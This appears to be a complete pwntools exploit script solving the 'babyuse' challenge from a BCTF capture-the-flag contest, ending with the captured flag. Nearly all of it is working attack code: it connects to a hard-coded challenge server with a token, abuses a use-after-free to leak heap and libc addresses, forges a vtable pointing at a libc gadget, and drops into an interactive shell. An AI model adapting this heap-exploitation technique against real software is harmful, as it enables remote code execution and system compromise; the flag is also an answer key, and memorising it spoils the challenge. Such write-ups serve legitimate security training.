#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools


if "remote" in sys.argv:
    r = remote("202.112.51.247", 3456)
    r.recvline()
    r.sendline("mEP6d1BeoEWizpISCDr80Jn5vj2HrGTy")
    libc = ELF("./libc.so")
else:
    r = process("./babyuse")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

s = "Exit\n"

def Buy(n, name):
    r.sendline("1")
    r.sendline(str(n))
    r.recvuntil("：\n")
    r.sendline(str(len(name)))
    r.recvuntil(":\n")
    r.send(name)
    r.recvuntil(s)

def Select(n):
    r.sendline("2")
    r.recvline()
    r.sendline(str(n))
    r.recvuntil(s)

def Rename(n, name):
    r.sendline("4")
    r.recvline()
    r.sendline(str(n))
    r.recvline()
    r.sendline(str(len(name)))
    r.recvline()
    r.send(name)
    r.recvuntil(s)

def Drop(n):
    r.sendline("6")
    r.recvline()
    r.sendline(str(n))
    r.recvline()
    r.recvuntil(s)

r.recvuntil(s)

# leak 
Buy(1, "G" * 128)
Buy(1, "G" * 128) 
Drop(0) 
Drop(1) 

r.sendline("5")
heap = u32(r.recvline()[-5:-1]) - 0x4ac0
base = heap - 0x5000
log.info("heap = " + hex(heap))
log.info("base = " + hex(base))
r.sendline("4")
r.recvuntil(s)

# leak libc 
Buy(1, "G" * 128)
Buy(1, "G" * 128) 
Buy(1, "G" * 128) 
Drop(0) 
Rename(1, p32(0) + p32(heap+0x4acc) + p32(100) + p32(100))

r.sendline("5")
r.recvuntil("Select gun ")
libc_base = u32(r.recvline()[:4]) - 0x1b27b0
log.info("libc_base = " + hex(libc_base))
r.sendline("4")
r.recvuntil(s)

# forge vtable
Rename(1, p32(libc_base + 0x3ac69) * 20)
Rename(1, p32(heap+0x4a18) + p32(libc_base) + p32(100) + p32(100))

r.sendline("5")
r.recvuntil("Main menu\n")
r.sendline("1")

r.interactive()

# bctf{ec1c977319050b85e3a9b50d177a7746}

